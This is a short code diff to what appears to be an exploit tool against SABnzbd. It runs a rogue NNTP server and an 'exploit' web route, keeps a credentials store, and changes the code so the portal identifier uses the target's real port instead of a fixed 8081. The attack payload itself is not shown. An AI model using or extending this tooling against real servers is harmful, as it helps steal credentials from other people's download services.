@@ -32,6 +32,7 @@ SESSION.headers.update({
 
 routes = web.RouteTableDef()
 credentials = defaultdict(list)
+host_ports: dict[str, Union[int, str]] = {}
 
 def get_sab_identifier(host: str, port: Optional[Union[int, str]] = None) -> str:
     """
@@ -76,7 +77,8 @@ def start_nntp_server(host: str, port: int) -> None:
 
         conn, addr = s.accept()
         print(f"[+] [NNTP] Connection accepted from {addr}")
-        identifier = get_sab_identifier(addr[0], 8081)
+        portal_port = host_ports.get(addr[0])
+        identifier = get_sab_identifier(addr[0], portal_port)
         print(f"  ∟ [NNTP] Portal identifier: {identifier}")
 
         with conn:
@@ -164,6 +166,9 @@ async def exploit(request: web.Request) -> web.Response:
         })
 
     print(f"[+] Targeting {target}")
+    if ":" in target:
+        host, port = target.split(":")
+        host_ports[host] = port
     identifier = get_sab_identifier(*target.split(":"))
     print(f"  ∟ Portal identifier: {identifier}")
 
